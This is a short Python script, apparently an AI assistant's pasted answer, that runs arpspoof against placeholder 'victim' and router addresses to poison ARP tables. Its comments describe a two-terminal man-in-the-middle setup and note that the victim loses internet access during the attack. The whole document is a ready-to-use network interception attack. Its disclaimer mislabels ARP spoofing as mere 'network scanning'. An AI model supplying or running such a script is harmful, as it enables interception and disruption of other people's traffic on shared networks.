# To execute the arpspoof command with the order of target IP addresses reversed, you can modify the script as follows:
# Remember to use this script responsibly and in compliance with any relevant laws and policies, as network scanning can raise legal and ethical considerations.


import subprocess

victim_ip = "victim_ip_here"
router_ip = "router_ip_here"
interface = "eth0"  # Change this to the appropriate network interface

def execute_arpspoof(interface, router_ip, victim_ip):
    try:
        # Build the arpspoof command with target IP addresses reversed
        command = ["arpspoof", "-i", interface, "-t", router_ip, victim_ip]

        # Execute the arpspoof command
        subprocess.run(command, check=True)

        print(f"arpspoof process started for router: {router_ip}, victim: {victim_ip}")

    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

execute_arpspoof(interface, router_ip, victim_ip)


# once done with the spoof don't forget to bring the arp table back to normal as the victim will not be able to connect to the net anymore.
# thankfully, arpspoof command do it for us, just type CTRL+C to end the process running on the terminal executing the arpspoof (in both terminal)

